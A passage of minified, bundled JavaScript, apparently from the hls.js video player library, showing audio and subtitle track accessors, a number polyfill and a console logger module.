                                    t && (t.audioTrack = e) } }, { key: "liveSyncPosition", get: function() { return this.streamController.liveSyncPosition } }, { key: "subtitleTracks", get: function() { var e = this.subtitleTrackController; return e ? e.subtitleTracks : [] } }, { key: "subtitleTrack", get: function() { var e = this.subtitleTrackController; return e ? e.subtitleTrack : -1 }, set: function(e) { var t = this.subtitleTrackController;
                                    t && (t.subtitleTrack = e) } }, { key: "subtitleDisplay", get: function() { var e = this.subtitleTrackController; return !!e && e.subtitleDisplay }, set: function(e) { var t = this.subtitleTrackController;
                                    t && (t.subtitleDisplay = e) } }]), t }(Ut);
                    bi.defaultConfig = void 0 }, "./src/polyfills/number.js": function(e, t, r) { "use strict";
                    r.r(t), r.d(t, "isFiniteNumber", function() { return i }), r.d(t, "MAX_SAFE_INTEGER", function() { return n }); var i = Number.isFinite || function(e) { return "number" == typeof e && isFinite(e) },
                        n = Number.MAX_SAFE_INTEGER || 9007199254740991 }, "./src/utils/get-self-scope.js": function(e, t, r) { "use strict";

                    function i() { return "undefined" == typeof window ? self : window }
                    r.r(t), r.d(t, "getSelfScope", function() { return i }) }, "./src/utils/logger.js": function(e, t, r) { "use strict";

                    function i() {}

                    function n(e, t) { return t = "[" + e + "] > " + t }

                    function a(e) { var t = c.console[e]; return t ? function() { for (var r = arguments.length, i = new Array(r), a = 0; a < r; a++) i[a] = arguments[a];
                            i[0] && (i[0] = n(e, i[0])), t.apply(c.console, i) } : i }

                    function s(e) { for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), i = 1; i < t; i++) r[i - 1] = arguments[i];
                        r.forEach(function(t) { u[t] = e[t] ? e[t].bind(e) : a(t) }) }
                    r.r(t), r.d(t, "enableLogs", function() { return d }), r.d(t, "logger", function() { return f }); var o = r("./src/utils/get-self-scope.js"),
                        l = { trace: i, debug: i, log: i, warn: i, info: i, error: i },
                        u = l,
                        c = Object(o.getSelfScope)(),
                        d = function(e) { if (c.console && !0 === e || "object" == typeof e) { s(e, "debug", "log", "info", "warn", "error"); try { u.log() } catch (e) { u = l } } else u = l },
                        f = u } }).default }) }]) });